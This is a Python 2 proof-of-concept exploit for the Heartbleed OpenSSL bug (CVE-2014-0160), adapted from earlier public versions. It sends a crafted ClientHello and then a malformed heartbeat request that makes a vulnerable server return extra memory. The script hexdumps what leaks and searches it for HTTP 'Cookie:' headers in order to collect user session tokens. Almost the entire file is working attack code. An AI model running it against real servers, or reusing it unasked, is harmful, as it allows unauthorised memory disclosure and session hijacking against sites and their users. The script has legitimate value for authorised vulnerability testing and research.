#!/usr/bin/python

# Modified by Samiux (on April 10, 2014) which is based on the code of Michael Davis.

# Connects to servers vulnerable to CVE-2014-0160 and looks for cookies, specifically user sessions.
# Michael Davis (mike.philip.davis@gmail.com)

# Based almost entirely on the quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)

# The author disclaims copyright to this source code.

import select
import sys
# import string
import struct
import socket
import time
from optparse import OptionParser

options = OptionParser(usage='%prog [ip|domain]:[port|protocal]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
# options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
# options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
# options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
# options.add_option('-c', '--cookie', type='str', default='session', help='Cookie to look for (default: session)')
# options.add_option('-l', '--length', type='int', default=1024, help='Length of the cookie (default: 1024)')


def parseServer(server):
    host = None
    port = 443

    server = server.split(':')
    host = server[0]
    if len(server) > 1:
        port = int(server[1])

    return host, port


def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')


def hexdump(payload):
    """
    Prints out a hexdump in the event that server returns an error.
    """
    for b in xrange(0, len(payload), 16):
        line = [c for c in payload[b:b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in line)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.')for c in line)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print


def stream_to_hex_str(binary_stream):
    # return map(lambda x: '%.2x' % x, map(ord, binary_stream))
    return "".join("{:02x}".format(ord(c)) for c in binary_stream)


def stream_to_str(binary_stream):
    # return ''.join((c if 32 <= ord(c) <= 126 else '.') for c in binary_stream)
    return ''.join(c for c in binary_stream)


def searchCookie(string):
    import re

    re_cookie = re.compile(r"Cookie: (.*)")

    for data in string.split('\r\n'):
        if re_cookie.search(data):
            print "Cookie: %s\n" % re_cookie.search(data).group(1)
            return re_cookie.search(data).group(1)

    return None


class mySSL(object):
    server_response = None
    socket = None
    found_sessions = set()
    hostname = ''
    port = 0
    cookie = ''
    cookie_length = 0

    def __init__(self, hostname='', port=0, cookie='', cookie_length=0):
        self.hostname = hostname
        self.cookie = cookie
        self.port = port
        self.cookie_length = cookie_length

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(5)  # server connection timeout
        sys.stdout.flush()
        self.socket.connect((self.hostname, self.port))
        sys.stdout.flush()

    def sendHello(self):
        """
        Connects to the remote server.
        """
        self.socket.send(hello)
        sys.stdout.flush()

    def receiveHello(self):
        return self.rcv_message()

    def receiveHandshake(self):  # print ServerHello, Certificate, ServerHelloDone
        while True:
            _type, version, payload = self.rcv_message()
            if _type is None:
                print 'Server closed connection without sending Server Hello.'
                return
            # Look for server hello done message.
            if _type == 22 and ord(payload[0]) == 0x0E:
                break

    def parseExtensions(self, pay):
        server_hello_extension_list = pay[44:]
        results = []

        i = 0
        while i < len(server_hello_extension_list):
            extension = {}

            ext_type = server_hello_extension_list[i: i + 2]
            i = i + 2

            ext_length = server_hello_extension_list[i: i + 2]
            _length = int(stream_to_hex_str(ext_length), 16)
            i = i + 2

            data = server_hello_extension_list[i: i + _length]
            i = i + _length

            extension['Type'] = stream_to_hex_str(ext_type)
            extension['Length'] = stream_to_hex_str(ext_length)
            extension['Data'] = stream_to_hex_str(data)

            results.append(extension)

        return results

    def checkHeartbeatExtension(self, pay):
        extensions = self.parseExtensions(pay)

        for extension in extensions:
            if int(extension['Type'], 16) == 15:
                return True

        return False

    def rcv_message(self):
        record_header = self.rcv_all(5)
        if record_header is None:
            print 'Unexpected EOF receiving record header - server closed connection'
            return None, None, None
        _type, version, line = struct.unpack('>BHH', record_header)
        payload = self.rcv_all(line, 10)
        if payload is None:
            print 'Unexpected EOF receiving record payload - server closed connection'
            return None, None, None
        return _type, version, payload

    def rcv_all(self, length, timeout=5):
        endtime = time.time() + timeout
        rdata = ''
        remain = length
        while remain > 0:
            rtime = endtime - time.time()
            if rtime < 0:
                return None
            r, w, e = select.select([self.socket], [], [], 5)
            if self.socket in r:
                data = self.socket.recv(remain)
                # EOF?
                if not data:
                    return None
                rdata += data
                remain -= len(data)
        return rdata

    def try_heartbeat(self):
        self.socket.send(hb)
        while True:
            _type, version, self.payload = self.rcv_message()
            if _type is None:
                print 'No heartbeat response received, server likely not vulnerable'
                return False

            if _type == 24:
                print 'Received heartbeat response:'
                # self.parse_response()
                if len(self.payload) > 3:
                    hexdump(self.payload)

                    searchCookie(stream_to_str(self.payload))

                    print 'WARNING: server returned more data than it should - server is vulnerable!'
                else:
                    print 'Server processed malformed heartbeat, but did not return any extra data.'
                return True

            if _type == 21:
                print 'Received alert:'
                hexdump(self.payload)
                print 'Server returned error, likely not vulnerable'
                return False

    # def parse_response(self):
    #     """
    #     Parses the response from the server for a session id.
    #     """
    #     ascii = ''.join((c if 32 <= ord(c) <= 126 else ' ')for c in self.payload)
    #     index = string.find(ascii, self.cookie)
    #     if index >= 0:
    #         info = ascii[index:index + self.cookie_length]
    #         session = info.split(' ')[0]
    #         session = string.replace(session, ';', '')
    #         if session not in self.found_sessions:
    #             self.found_sessions.add(session)
    #             print session

    # def scan(self):
    #     self.connect()
    #     self.rcv_response()
    #     self.try_heartbeat()


def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    host, port = parseServer(args[0])

    try:
        ssl = mySSL(hostname=host, port=port)
        ssl.sendHello()
        type, version, payload = ssl.receiveHello()
        if type is None:
            print 'Server closed connection without sending Server Hello.'
        else:
            if ssl.checkHeartbeatExtension(payload):
                print "Heartbeat extension found"
                print 'Sending heartbeat request...'
                ssl.try_heartbeat()
            else:
                print "No heartbeat extension found"
    except Exception, e:
        print e

if __name__ == '__main__':
    main()
